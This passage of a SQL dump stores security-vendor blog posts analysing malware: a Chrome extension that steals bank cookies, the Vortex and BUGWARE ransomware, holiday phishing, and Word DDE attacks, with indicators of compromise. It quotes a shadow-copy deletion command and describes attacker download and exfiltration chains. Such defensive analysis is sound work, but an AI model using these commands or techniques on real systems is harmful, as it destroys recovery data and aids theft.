developer mode extension warning\r\n\r\nThe above warning is shown by Chrome browser when any Chrome extension is loaded into the browser that is not signed and authorized by official Chrome webstore. The batch script is copied from a post on StackOverflow site:\r\n\r\n\r\n\r\nFigure 4. Batch script for patching Google Chrome to disable warning\r\n\r\nBefore terminating, the malware connects to https://goo[.]gl/GxWtnE, a shortner URL leading to legitimate site www.uol.com[.]br (UOL is, the largest Brazilian content, digital services and technology company). We did not see any obvious reason for this request from our analysis other than generating legitimate traffic to blend in. At the time of our analysis there were total 631 hits on the shortened URL, most of which are probably victims, with some from sandboxes and analysts.\r\n\r\nWhenever Chrome is run, it will start up loaded with the malicious extension and won’t show any popup warning. The extension will sit there waiting for the user to visit targeted sites. As soon as the user visits any of those sites, the extension will activate and set the proxy to redirect user traffic to the attackers server. The following are the extension details.\r\n\r\n\r\n\r\nFigure 5. Malicious extension loaded in Google Chrome\r\n\r\nExtension analysis\r\n\r\n\r\n\r\nFigure 6. Extension manifest.json file\r\n\r\nThe manifest file is a JavaScript Object Notation (JSON) formatted file that must be present in every extension. It defines all permissions, scripts and URL expression matches and other important details about the extension. This manifest reveals much of the extension\'s functionality. This extension poses as “Google Secure Web” extension with the description “Segurança para o seu navegador,” which translates to “Security for your browser.”\r\n\r\nIt requests following permissions:\r\n\r\n\r\n	“tabs” : Access to privileged fields of the tab objects used by several APIs, including the chrome.tabs APIs, to interact with the browser\'s tab system. You can use this API to create, modify, and rearrange tabs in the browser.\r\n	“http://*/*,https://*/*, *://*/*\": All protocols and all URLs.\r\n	“webNavigation” : Access to the chrome.webNavigation API to receive notifications about the status of navigation requests in-flight.\r\n	“webRequest” : Access to the chrome.webRequest API to observe and analyze traffic and to intercept, block, or modify requests in-flight.\r\n	“webRequestBlocking” : Use of the chrome.webRequest API for blocking.\r\n	“Storage” : chrome.storage API to store, retrieve, and track changes to user data.\r\n	“cookies” : chrome.cookies API to query and modify cookies, and to be notified when they change\r\n	“activeTab” : The activeTab permission gives an extension temporary access to the currently active tab when the user invokes the extension, for example, by clicking its browser action. Access to the tab lasts until the tab is navigated or closed.\r\n	“proxy” : chrome.proxy API to manage Chrome\'s proxy settings.\r\n\r\n\r\nThe manifest file specifies a wildcard for web_accessible_resources, sets “jquery.js” and “background.js” as background pages and “jquery.js” and “content.js” as content scripts to run on all frames of all web pages by injecting them at end of DOM.\r\n\r\nBackground pages are long-running code segments; when the extension is started the background page runs as long as the browser is running or when the extension is disabled.\r\n\r\nContent Scripts are JavaScript files that run in the context of web pages; they can read or modify DOM.\r\n\r\nIt also specifies “*://www2.bancobrasil.com.br/*” and “*://*.bb.com.br/*” as externally_connectable so that these web pages can connect to the extension via runtime.connect and runtime.sendMessage.\r\n\r\nBackground Script\r\n\r\nBackground script is obfuscated JavaScript code.\r\n\r\n\r\n\r\nFigure 7. Obfuscated script\r\n\r\nAfter deobfuscation, we can see human readable code as shown in Figure 8 and Figure 10.\r\n\r\nThis script adds two callbacks for messages received from the content script, and it acts on two commands, “prx” and “bj”: \r\n\r\n“prx” - sets “191.252.186[.]175:9595” as proxy.\r\n\r\n\r\n\r\nFigure 8. Script code for setting proxy in Google Chrome\r\n\r\n\r\n\r\nFigure 9. Proxy in action\r\n\r\n“bj” : Steals session cookies for “aapj.bb.com[.]br” and sends to attacker controlled “novodominioxk01[.]asia/clientes.php” along with other data received from content script in following format:\r\n\r\n\"texto\": {data_from_extension} sessao= { \"domain\": \"aapj.bb.com.br\", \"hostOnly\": true, \"httpOnly\": false, \"name\": \"JSESSIONID\", \"path\": \"/\", \"sameSite\": \"no_restriction\", \"secure\": false, \"session\": true, \"storeId\": \"0\", \"value\": \"{cookie_value}\", \"id\": 16} \r\n\r\n\r\n\r\nFigure 10. Script code for sending stolen data to C&C\r\n\r\nContent Script \r\n\r\nContent script is also obfuscated similar to the background script and can be read after deobfuscation. If any of “aapj.bb.com[.]br,” “bb.com[.]br,” or ”bancobrasil.com[.]br” is visited, it will send the “prx” command to the background script, which will set proxy and, in the case of “aapj.bb.com[.]br,” will also inject JavaScript code in the web page to intercept a click with following button IDs “botao.acao.ok,” “botao.acao.assinar,” and “botao.acao.entrar” (translation “Button.Action.Ok, Sign, and Log In”).\r\n\r\n\r\n\r\nFigure 11. Script code for sending \"prx\" command if required url is visited\r\n\r\nWhen any of those buttons are clicked, it will intercept the click event, get the value of “senhaConta” (translation “passwordContact”) and ID “param” and send “bj” command to the background script with these values. It in turn sends these values and session cookies to the command and control (C&C) server.\r\n\r\n\r\n\r\nFigure 12. Script code for sending intercepted data and \"bj\" command\r\n\r\nString Decryption \r\n\r\nInteresting strings in the malware are in encrypted format and it decrypts on the fly as per the requirement. The following python code can be used to decrypt strings:\r\n\r\n\r\nFigure 13. Python code to decrypt strings\r\n\r\nEncrypted and decrypted strings:\r\n\r\n687488A106CE : chrome\r\n26E0260A25B4E22E27A4F07DB58639EF49 : --load-extension=\r\n2B2CC098812D4CBC6F8EA9B195360F826555157EF689BC964322517DF0DE550B2B : --allow-running-insecure-content\r\n66B51E13261D8EEFF89CEA27 : manifest.txt\r\n66B51E13261D8EEFF8829417FA : manifest.json\r\n66B51E13261D8EEFF8829417FAE4CB96DF : manifest.json.off\r\n61EE8686DD229441DCBD : jquery.txt\r\n61EE8686DD22945FAC : jquery.js\r\n61EE8686DD22945FAC07C79554 : jquery.js.off\r\n69A10DED4EA4045442828506E420 : background.txt\r\n69A10DED4EA404544282851855 : background.js\r\n69A10DED4EA404544282851855A213484E : background.js.off\r\n6873389F03983CBFF2C15C : content.txt\r\n6873389F03983CBFEC92 : content.js\r\n6873389F03983CBFEC92489941A7 : content.js.off\r\n48A2400D0B5D78620FCC355BAFD7FDE08C4DD0027AF3967944909FD82AC18047A0DE7EE37BFD1A7F15F281E791036A553D3797A30A : C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\r\n48A2400D0B5D78620FCC355BAFD7FDE0F00D4D4E3F6671721952E44159960D83822C738AEEFE6F73B7B7E7D361A8E0950E1D38E5EA1D3638878F51 : C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\r\n687488A106CE272628ED : chrome.dll\r\n69A1404370F7 : ba.txt\r\n254B4A8B : .bat\r\n7FA8565288971357 : trocakid\r\n577B46B70F74CBE606F6A2 : \\Microsoft\\\r\n6393A7C1048E6B935ABD84437B796BB93F5A643AA7 : https://goo.gl/GxWtnE\r\n\r\nIOCs\r\n\r\nMD5:\r\nF185CAB8C543031A32C83FA5B20183BF\r\nZIP MD5:\r\n3E0B6122B2DB060D15FF7AF20AC0925B\r\nNetwork:\r\ns3.amazonaws[.]com/detr81383217/12421412412512.zip?_sm_au_=irMkksnF4jQrsDsR\r\n185.109.163[.]73/mani/manifest.txt\r\n185.109.163[.]73/mani/jquery.txt\r\n185.109.163[.]73/mani/background.txt\r\n185.109.163[.]73/mani/content.txt\r\n185.109.163[.]73/mani/ba.txt\r\n191.252.186[.]175:9595\r\nnovodominioxk01[.]asia/clientes.php', 'Malware', 'https://www.zscaler.com/blogs/research/malicious-chrome-extension-steals-cookies-and-credentials-bank-customers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (46, 'A look at two ransomware strains using open source code', 'Avinash Kumar,', 'December 01, 2017', 'Introduction\r\n\r\nRansomware has undoubtedly become one of the most prevelant and most prolific malware families, earning large profits for cybercriminals. There have been several dozen new ransomware strains and attacks seen in 2017, including the infamous global ransomware outbreaks of WannaCry, Petya, and BadRabbit that impacted millons of computers world-wide. In this blog, we explore two ransomware strains from 2017 - Vortex and BUGWARE, both of which are compiled in Microsoft Intermediate Language (MSIL) and packed with the \'Confuser\' packer. Interestingly, both ransomware strains are using open source code for encrypting user files.\r\n\r\nThreatlabZ, the research division of Zscaler, has been tracking these strains and is seeing payloads actively being pushed to the users via spam campaigns containing malicious URLs. \r\n\r\nCase #1 - Vortex Ransomware\r\n\r\nVortex, written in Polish, employs the AES-256[2] cipher to encrypt victims\' image, video, audio, document, and other potentially important data files. The ransom note informs victims about the restoration of files and details how to send the ransom. The ransom note has the title “##@@ INFO O PLIKACH.txt.”\r\n\r\n \r\n\r\n\r\n\r\n                                                                                Figure 1: Ransom note\r\n\r\nIn this example, two files are getting decrypted for free and the ransom demand is $100, which will increase to $200 in four days. This variant offers two email IDs for contacting the attacker: Hc9@2.pl and Hc9@goat.si.\r\n\r\nInstallation\r\n\r\nThe malware creates a registry entry for persistence.\r\n\r\n                                                            Figure 2: Registry Entry\r\n\r\n \r\n\r\nIt also creates a registry key called “AESxWin.”                                                               Figure 3: Registry Key\r\n\r\n     \r\n\r\n       \r\n\r\nUpon execution, the malware will attempt to encrypt the files with following extension on the victim machine:\r\n\r\n                                                                Figure 4: Filetypes encrypted by Vortex\r\n\r\n \r\n\r\nThe following is a list of other file types that will get encrypted by the Vortex ransomware.\r\n\r\n                                                            Figure5: Other Filetypes that will be encrypted by Vortex\r\n\r\n \r\n\r\nVortex also deletes all the shadow copy of restore point by running the following command:\r\n\r\nvssadmin.exe delete shadows /all /Quiet\r\n\r\nThis ensures that the victim cannot recover their files by restoring the system to a preinfection state.\r\n\r\nCommand and Control (C&C) communication:\r\n\r\nThe following screenshot shows the ransomware requesting the password API, which is random and changes with every request:\r\n\r\n                                                            Figure 6:Password API request\r\n\r\n \r\n\r\nThis screen shows the malware contacting the C&C server and sending system information.                                                            Figure7: Sending system info to C&C\r\n\r\n  \r\n\r\n \r\n\r\nThe following is a screenshot of the password API used for the encryption and decryption key.\r\n\r\n                                           Figure8: Get request with IP, System ID, Data and Password API\r\n\r\n \r\n\r\nWhile analyzing the malware, we saw that its code was entirely based on AESxWin, which is a freeware encryption and decryption utility hosted on GitHub, and was created by Egyptian developer Eslam Hamouda.\r\n\r\n                                           Figure9: Developer signature in stolen code\r\n\r\n \r\n\r\nWe further validated the unaltered usage of this tool in Vortex ransomware by successfuly decrypting the files on the infected system using the AESxWin utility with the same password that was used for encryption.\r\n\r\n                                                  Figure10: Decryptor\r\n\r\n \r\n\r\nCase #2 - BUGWARE Ransomware\r\n\r\nA new ransomware strain called BUGWARE [first seen Oct 2017] uses the open source Hidden Tear code. It encrypts the files and, for ransom, requests the equivalent of a thousand Brazilian real in a virtual currency called MONERO. The main BUGWARE payload uses an invalid certificate pretending to be for GAS INFORMATICA LTDA.\r\n\r\n                                                       Figure11: Invalid Certificate\r\n\r\nPayload analysis\r\nFirst, it searches for the file “%AppData%\\Lista.log.” If this file is found, the malware will terminate itself.\r\n\r\nBUGWARE stores a list of whitelisted path in Criptografia.whitelist variable and will not attempt to encrypt the files present in those folders.\r\n\r\n\r\n	%ProgramFiles%\r\n	%ProgramFilesX86%\r\n	%Windows%\r\n	%AppData%\\Roaming\r\n	%AppData%\\Local\r\n\r\n\r\nIt also avoids ecnrypting files in directories that contain the following strings:\r\n\r\n\r\n	$recycle.bin\r\n	Intel\r\n	Nvidia\r\n\r\n\r\nThe payload creates a list of paths to encrypt and store in the Criptografia.pathstoencrypt list.\r\n\r\n\r\n	%Desktop%\r\n	%Documents%\r\n	%Music%\r\n	%Pictures%\r\n	%Videos%\r\n\r\n\r\nIt searches for fixed, network, and removable drives, and adds those paths into the Criptografia.pathstoencrypt list.\r\n\r\nEncryption Process\r\nBUGWARE generates a random GUID using the passworrandom.com website and adds “-DCLXVI” at the end of the string and stores in the AES.senha variable. If the payload is unable to get the GUID from that website, it generates AES.senha using following combination - “DCLXVI-{generate GUID using Guid.NewGUID() function}.”\r\n\r\n                                                   Figure12: Generating Key\r\n\r\n \r\n\r\nIt generates a key by calculating SHA-256 of AES.sneha. User files are then encrypted using the AES 256-bit algorithm leveraging the key stored in AES.sneha.\r\n\r\nAfter encryption, the malware renames files with “filename.[SLAVIC@SECMAIL.PRO].BUGWARE” and makes each file\'s entry in Lista.log file. It changes the CreationTime, LastAccessTime, and LastWriteTime with a random datetime format.\r\n\r\n                                                      Figure13: Modifying Filename and File Properties\r\n\r\n \r\n\r\nThe following screenshot displays the targeted file extensions encrypted by BUGWARE.                                                      Figure14: Targeted File extension\r\n\r\n \r\n\r\nBUGWARE will download image files from “i[.]imgur.com/NpKQ3KZ.jpg\" and set this image as the victim’s desktop background after restarting the system.\r\n\r\n                                                    Figure15: Bugware Wallpaper\r\n\r\n \r\n\r\nAfter encrypting files, BUGWARE shows its warning messages. This example ransom note here is shown in Portuguese.\r\n\r\n                                                          Figure16: Ransom Note\r\n\r\n \r\n\r\nThe malware further encrypts the AES key using RSA Public key. It saves the base64 encoded key in the registry path \"HKCU\\SOFTWARE\\BUGWARE\\chavepriv8\\\"\r\n\r\nThe RSA public key is stored as XML format in the minhachave variable as shown below.\r\n \r\n\r\n                                                        Figure17: Base64 Encoded RSA Public key\r\n\r\n \r\n\r\nFor persistence, the malware creates a run key to execute each time the user logs on. It executes the BUGWARE with “OK” arguments that display the ransom note.\r\n\r\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\BUGWARE\\\r\n\r\nThe malware checks for the presence of a removable drive and if found, it drops a copy of itself with the name “fatura-vencida.pdf.scr.”  \r\n \r\n\r\nC&C communication:\r\n\r\nBUGWARE sends the base64 encoded data to its C&C at getrichordietryin[.]xyz.                                                         Figure18: C&C Commnication\r\n\r\n \r\n\r\nDecoded data\r\n\r\nMaquina: Machine name\r\nDominio: Network domain name associated with the current user\r\nID:Volume serial number \r\nPrazo: Date and time of dealine (Add 3 days to current date)\r\nArquivos: Number of encrypted files\r\nSO: Operating system\r\n\r\nIt also stores the information in the registry key HKCU\\SOFTWARE\\BUGWARE\\.\r\n\r\n\r\n\r\n\r\n                                                         Figure19: Data stored in Registry Keys\r\n\r\n \r\n\r\nIndicators of Compromise\r\n\r\nMD5: \r\n\r\nFDF777C8C92355AD95C5AB7E4AA0A32A [Vortex]\r\n\r\n35A3864D4BE9E7A7303C370879B8B8D1 [Vortex]\r\n\r\n6A9F56A2F298E5ACB6B2E84BB2864E08 [BUGWARE]\r\n\r\nNETWORK:\r\n\r\ndepartamento-vendas[.]xyz/doc_2017100200000-16_pdf.scr \r\n\r\ngetrichordietryin[.]xyz/sender.php\r\n\r\nFILESYSTEM:\r\n%AppData%\\Lista.log\r\n%Desktop%\\bugware.bmp\r\n\r\nREGISTRY:\r\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\BUGWARE\\\r\nHKCU\\SOFTWARE\\BUGWARE\\Arquivos\r\nHKCU\\SOFTWARE\\BUGWARE\\Chavepriv8\r\nHKCU\\SOFTWARE\\BUGWARE\\Enviado\r\nHKCU\\SOFTWARE\\BUGWARE\\ID\r\nHKCU\\SOFTWARE\\BUGWARE\\prazo', 'Ransomware', 'http://www.zscaler.com/blogs/research/look-two-ransomware-strains-using-open-source-code');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (47, 'Black Friday Deals: Trojans, Phishing, and Crypto Coin Mining', 'Chris Mannon,', 'November 21, 2017', 'Thanksgiving is once again upon us, followed by \"Black Friday,\" which typically means one of two things: you will either be spending time with family as you recover from a food hangover, or you will be fighting the crowds for deals at retail stores.    But wait! There is a way you can have your pumpkin pie and eat it too.    These days most shopping outlets promote their Black Friday/Cyber Monday deals on their websites in advance of the holiday; many offer great online deals and perks like free shipping to entice shoppers to avoid the crowds and shop online. But beware: malware authors anticipate the increase in online shopping and use the season to manipulate users to their own ends.    As shopping increases, so do risks    Today’s bad actors use a variety of methods to lure users into clicking malicious links or opening infected files. They use phishing to attempts to harvest credentialsor lead victims to less-than-reputable stores. They send opaquely named files and create websites designed to confuse recipients. They can even use your CPU resources when you visit their shop to mine Crypto Currency without consent. In this blog, we will describe in further detail how some of these techniques are being used, and how to avoid them.    When does it all start?    In the Zscaler cloud, we start to see an increase in shopping activity as early as November 1st. No sooner are we putting away our jack-o-lanterns than we start to look forward to the shopping season. It’s really no wonder that Starbucks starts its holiday music onslaught the day after Halloween.    Shoppers tend to do most of their holiday shopping over non-mobile PC devices. While it might be easier to navigate shopping sites on a big screen, PC users are at an added risk of phishing attacks. In Fig. 1, you can see that phishing attempts are high at the onset of the shopping season. Mobile users are actually less prone to phishing attacks, because they tend to use specific trusted apps rather than surfing the open internet. Fig. 2 shows us that there is a slight uptick in shopping activity on mobile devices while phishing attempts start to fall.         Fig 1: Shopping trends steadily rise closer to black Friday, and so do phishing attempts.        Fig 2: Mobile shopping trends steadily increase while scam attempts dwindle.    Domain Squatting    “Domain squatting” is the act of buying up domain names that are visually similar to the names of legitimate websites or companies, typically with the intent of defrauding users or convincing them that the content on the domain can be trusted. The multitude of new top-level domains (TLDs) that ICANN has made available has given criminals many opportunities to grab up domains that are identical or similar to real company websites, but with a different TLD suffix.    Especially relevant this season is the “.blackfriday” TLD. This domain is meant specifically for pages dealing with Black Friday sales, and is commonly used by various corporations to link to sales on their online stores or to Black Friday marketing content.    We have observed multiple instances of malicious actors domain squatting “.blackfriday” TLDs, such as these examples of domains that are visually similar to Google domains:      	gooogle[.]blackfriday  	guugle[.]blackfriday      Both of these domains were registered earlier this year, and have been seen serving various forms of malicious content. The first domain, “gooogle[.]blackfriday,” was used to deliver a Microsoft Outlook phishing page, as well as infect users with the Fareit Trojan. Fareit is a commodity infostealer that is typically used to harvest stored passwords and credentials from web browsers.    Fareit MD5: 76c016592f189d6de4166c5907f5063b    The second domain, “guugle[.]blackfriday,” was used as a command-and-control server for users infected with the commodity malware Loki. Loki is an infostealer that is capable of stealing stored passwords and cryptocurrency wallet information from a variety of applications. It is believed that this URL was spread through malicious email campaigns.    Loki MD5: ab8f64e3d30ab00518935c1e68617f73    The combination of a familiar-looking domain name with the “.blackfriday” TLD puts online shoppers especially at risk for accidentally visiting a malicious site while browsing for Black Friday deals and sales this season. Users should be careful to inspect the URLs they visit online to make sure they are legitimate, and to avoid clicking on links in emails from untrusted sources.    Crypto currency mining activity    Crypto currency mining has become a popular method of monetization, as reported in this blog. Instead of relying on advertising revenue, site owners will embed a script in their site that will leverage the user’s browser to begin mining crypto currency. This activity is very CPU intensive on victims’ systems and it’s done completely without their knowledge or consent. Furthermore, the only way to stop the activity from continuing after you leave the site is to completely shut down your browser.    The screen capture below shows the number of crypto currency mining attempts we’ve seen since the start of the shopping season (attempts were blocked before they could begin mining activity).        Fig 3: Shopping keywords seen in referer URL of Cyrpto currency mining attempts.    Fake Shops    Finding the best deals can be tricky, and the number of fake shops that seem to crop up around this time of year make things far more difficult. Performing a basic Google search can yield highly suspect shops touting themselves as offering legitimately good deals. The following result was found on the front page of a Google search for “Ray-Ban sunglasses.”        Fig 4: Top search—too good to be true    The above result is convincing; with its legitimate-sounding domain name, it could be a real outlet store offering great deals. But the Whois records tell a different tale.      	Domain Name: rayban-outlet.us  	Registrant Name: Jiang Yongxin  	Registrant Street: Shanghai 1  	Registrant City: Shanghai  	Registrant State/Province: Shanghai  	Registrant Country: CN  	Registrant Email: jyt.832104@gmail.com          Fig 5: Seemingly legitimate page    We checked the registrant email for the site, and the threat intelligence organization DomainTools shows 18 other websites created under the same email address. Running fraudulent stores is yet another way for threat actors to profit from unsuspecting users.    Phishing documents    Malicious documents sent via email are one of the most prevalent threats users face. Often, these documents are distributed in phishing campaigns, where the malicious actor pretends to be a legitimate source or company in an attempt to earn the victim’s trust (and to entice victims to open an attachment or click a link).    More sophisticated “spear-phishing” attacks target individual users or organizations by mimicking a source that is unique to them, such as their employer or business associates. The combination of these spear-phishing techniques with Black Friday branding, especially when linked with phrasing that would suggest sales, bargains, or contests, can significantly increase the likelihood that targeted users will fall victim to the malicious campaign.    Targeted phishing documents like the following are typical of these sorts of attacks. We came across the following malicious document in one of the major security feeds that we monitor where the filename used is “Black Friday Bonus Registration.docx,” suggesting the Black Friday theme as well as a potential reward to incentivize users into opening the document attachment.             Fig 6: Fake “Black Friday Bonus Registration.docx” document with embedded malicious application     The document, with carefully reproduced corporate branding, encourages the user to open an embedded application, which installs malicious software onto the victim’s computer.    Conclusion    The Zscaler ThreatLabZ team is working around the clock to ensure that our customers do not fall prey to the kinds of malicious activities we\'ve described here. To protect yourself this year (and every year), we highly recommend that all online shoppers exercise extreme caution and follow our holiday season shopping security checklist:      	Inspect the source of emails with enticing shopping deals; be wary of any suspicious attachments  	Steer clear of unofficial mobile application stores  	Ensure HTTPS/secure connections to online retailers and banking sites  	Check the authenticity of the URL or website address before clicking on a link  	Stay away from emailed invoices, which is a social engineering technique often used by cyber criminals to download threats like Win32.Trojan.Emotet, reported in this blog  	Do not use unsecured public Wi-Fi for shopping  	Use two-factor authentication whenever possible, especially on sensitive accounts such as those used for banking  	Always ensure that your operating system and web browser are up to date and have the latest security patches installed  	Use browser add-ons like Adblock Plus to block popups and potential malvertisements  	Use browser add-ons like No Coin to block store attempts to use your computer for crypto currency mining  	Back up your documents and media files  	Review the Identity Theft Guide and FAQs from the Federal Trade Commission      Wishing you all a very happy, healthy, and safe Thanksgiving!', 'Analysis;Malware;Mobile;Phishing;Scam', 'https://www.zscaler.com/blogs/research/black-friday-deals-trojans-phishing-and-crypto-coin-mining');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (48, 'Microsoft DDE protocol based malware attacks', 'Mohd Sadique', 'November 15, 2017', 'Introduction\r\n\r\nOver the past few weeks, there have been several reports about the Microsoft Dynamic Data Exchange (DDE) vulnerability. To no one\'s surprise, hackers have been quick to exploit this vulnerability to spread malware through rigged Microsoft Word documents.\r\n\r\nIn this same timeframe, the Zscaler ThreatLabZ team has seen a number of these malicious documents using the DDE vulnerability to download and execute malware. Most of the payloads we saw were Remote Access Trojans (RATs), ransomware, and backdoors.\r\n\r\nIn this blog, we will share a detailed technical analysis of a few of these exploitations and their payloads.\r\n\r\n \r\n\r\nBackground\r\n\r\nThe Microsoft Dynamic Data Exchange (DDE) protocol allows data to be transferred between applications. These applications can use DDE for one-time data transfers or for continuous exchanges; for example, a Microsoft Word document that uses data from an Excel spreadsheet is updated automatically through DDE as the spreadsheet data is updated. The DDE protocol sends messages between applications that share data and uses shared memory to exchange data between the applications. \r\n\r\nMicrosoft Word documents have been used before to spread malware, but in those cases the victim would have to manually enable macros for the payload to be downloaded onto the victim’s system. With the DDE vulnerability (feature) in Microsoft Word, attackers can embed a malicious script that can download and execute malware without the use of macros.\r\n\r\n \r\n\r\nCase I: DDE protocol abuse leads to post-exploitation using PowerShell\r\n\r\nOne Word file we analyzed exploited the DDE vulnerability to download and execute a PowerShell script using a post-exploitation framework.\r\n\r\nFilename - Communications_Suggestions_by_Press_Office_Director.docx\r\n\r\nThe document looks like this:\r\n\r\n\r\n\r\nFig1: Malicious document\r\n\r\nGenerally, fake documents like this are spread via an email campaign targeting small and large groups of businesses in numerous industry sectors.\r\n\r\nThe workflow of the document is as follows:\r\n\r\n\r\n\r\nFig2: Document Workflow (case I)\r\n\r\nIn this document, the attacker uses the DDE protocol to launch a Windows command line tool (cmd.exe), which uses PowerShell to download and execute the malware from a given URL.\r\n\r\nThe field content looks like this:\r\n\r\n\r\n\r\nFig3: DDE field code\r\n\r\nIt downloads and executes a file using cmd.exe and PowerShell, which is present at the following URL: hxxp://citycarpark[.]my/components/com_admintools/mscorier.\r\n\r\nThe downloaded data (mscorier) is an obfuscated batch script that creates a PowerShell script and executes it.\r\n\r\n\r\n\r\nFig4: Obfuscated batch script (payload 1)\r\n\r\nThis script downloads another payload (wsdprintproxy) from hxxp://185.128.42[.]194/wsdprintproxy and stores it in the following registry to make itself persistent:\r\n\r\nHKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\ThemeVersion\r\n\r\n\r\n\r\nFig5: Storing payload 2 in registry\r\n\r\n\r\n\r\nFig6: Registry entry of payload 2\r\n\r\nFor persistence, payload 1 also creates two scheduled tasks, which execute the obfuscated script.\r\n\r\n\r\n\r\nFig7: Code for persistence\r\n\r\nOne scheduled task is created with name FlashUpdateServiceInit, which runs daily at 11:00 a.m., and another task with name FlashUpdateService, which runs daily at 3:00 p.m.\r\n\r\nAfter these tasks run, the script bypasses the PowerShell ScriptBlock logging, which means that the first execution of the malicious script will turn off all further logging.\r\n\r\n\r\n\r\nFig8: Enabling script block logging\r\n\r\nTo download its next payload, the malware initiates a GET request with the cookie “session=j4ppw/hpWdU/l5V3v9eymlAYxmE=” and downloads payload 3 from hxxps://185.128.42[.]194:8080/news.php.\r\n\r\n\r\n\r\nFig9: Downloading payload 3 from server\r\n\r\n\r\n\r\nFig10: Downloaded encrypted payload 3\r\n\r\nThe downloaded data is encrypted with RC4.\r\n\r\nData[0:4] = IV\r\n\r\nData[4:length(Data)] = Encrypted data\r\n\r\nKey is hardcoded in the script which is:\r\n\r\nKey = “a231fe7690a85f02eb147f53229c8e02”\r\n\r\n\r\n\r\nFig11: RC4 algorithm\r\n\r\nThe script will decrypt the downloaded data. It is, again, a PowerShell script, which is executed after decryption.\r\n\r\nThe decrypted PowerShell script sends the encrypted RSA key with “IV” to the server at: hxxps://185.128.42[.]194:8080/news.php. In response, the server sends the encrypted AES key to victim.\r\n\r\nThe script fetches information from the victim’s machine, encrypts it with the AES key, and sends it to the server at: hxxps://185.128.42[.]194:8080/process.php.\r\n\r\nNonce|Server_URL|UserDomainName|UserName|Machine|IPAddress|OperatingSystem|True(if UserName=”system”)Otherwise False|CurrentProcessName|ProcessID|powershell|PowershellVersion\r\n\r\nThe server responds with the final payload PowerShell script which appears to be a part of the PowerShell empire framework post-exploitation.\r\n\r\nTransactions of this post-exploitation framework look like this:\r\n\r\n\r\n\r\nFig12: Network transactions\r\n\r\nThe PowerShell empire is a post-exploitation framework that provides a Metasploit-like framework in PowerShell and Python. It includes different types of backdoors with multiple modules. It deals strictly with Windows machines and is extremely useful in penetration testing. In some cases, however, attackers use this framework to hijack a user’s system and perform malicious activities.\r\n\r\n \r\n\r\nCase II: DDE protocol abuse leads to Locky ransomware\r\n\r\nIn another recent case, a campaign of spam emails was delivering a Word document attachment that used the DDE technique, and the final payload of that campaign is Locky ransomware.\r\n \r\n\r\n\r\n\r\nFig 13: DDE protocol abuse leads to Locky ransomware (case II)\r\n\r\nIn this case, attackers are writing obfuscated malicious field code in Word documents to evade detection; this code can be found in word-document.xml after extraction.\r\n\r\n\r\n\r\nFig14: Field word-document.xml obfuscated code\r\n\r\nThe exploit downloads the encoded PowerShell script from:  hxxp://lestrangeresearch[.]com/kdjsw23FGS. It then decodes and executes it through cmd.\r\n\r\n\r\n\r\nFig15: Encoded PowerShell (payload 1)\r\n\r\nThe decoded script look like this:\r\n\r\n\r\n\r\nFig16: Decoded PowerShell script (payload 1)\r\n\r\nThe decoded PowerShell script has six hardcoded malicious URLs.\r\n\r\nThe script will try to download the content from a URL and store it in %temp% with the name hti4.exe. Upon successful download, the script executes the downloaded file.\r\n\r\n\r\n\r\nFig17: Downloaded payload 2\r\n\r\nPayload 2 is the intermediate payload. Its function is to check the system for specified parameters. If it satisfies specific criteria, it then downloads encrypted data from:  hxxp://spooner-motorsport[.]com.\r\n\r\n\r\n\r\nFig18: Encrypted Locky ransomware (payload 3)\r\n\r\nThis encrypted data is decrypted and launched by the intermediate payload (payload 2).\r\n\r\nAfter decryption, the final payload is Locky ransomware, which encrypts the files, appends the .asasin extension after encryption, and demands ransom in Bitcoin for decryption.\r\n\r\n\r\n\r\nFig19: Ransom note (asasin.bmp)\r\n \r\n\r\n\r\n\r\nFig20: Locky payment site\r\n\r\n \r\n\r\nCase III: Attack in New York\r\n\r\nRecently, researchers at McAfee found a new phishing campaign from Russia\'s hacking group APT28 known as “Fancy Bear.”\r\n\r\nAPT28 capitalized on the recent terror attack in New York City by spreading email with an attached malicious Word document named IsisAttackInNewYork.docx, and the document appears to leverage the DDE technique.\r\n\r\nIn this case, the first-stage payload was a PowerShell script that downloads another base64 encoded PowerShell script. After that, the second-stage payload script downloads a new variant of Seduploader, which is spyware capable of taking screenshots, gathering sensitive data, and other intrusive activities.\r\n\r\n \r\n\r\nPreventions:\r\n\r\nIf a document contains embedded malicious DDE code, it shows the following warning to users as they open it. \r\n\r\nFig 21: Microsoft Word warning\r\n\r\nThe best way to prevent this DDE attack vector is to click “No” when this dialog box appears; this will stop further execution of the malware.\r\n\r\nAnother way to prevent this attack is to disable it by modifying the registry.\r\n\r\nMicrosoft has also published security advisory for securely opening Microsoft documents that contain a DDE field.\r\n \r\n\r\nConclusion:\r\n\r\nAttackers are abusing the Microsoft DDE protocol to download and execute malware using PowerShell. In an earlier case, PowerShell led to an entire post-exploitation framework used for penetration testing. But attackers are using the framework for malicious purposes, such as stealing a user’s sensitive information, uploading and executing malware on a user’s machine, altering the user’s data, and so on. In recent cases, the DDE protocol led to ransomware, including Locky, which encrypts the victim’s data and demands ransom for the decryption.\r\n\r\nThe malware analyzed in this blog is detected as COM.Downloader.DDE', '', 'https://www.zscaler.com/blogs/research/microsoft-dde-protocol-based-malware-attacks');
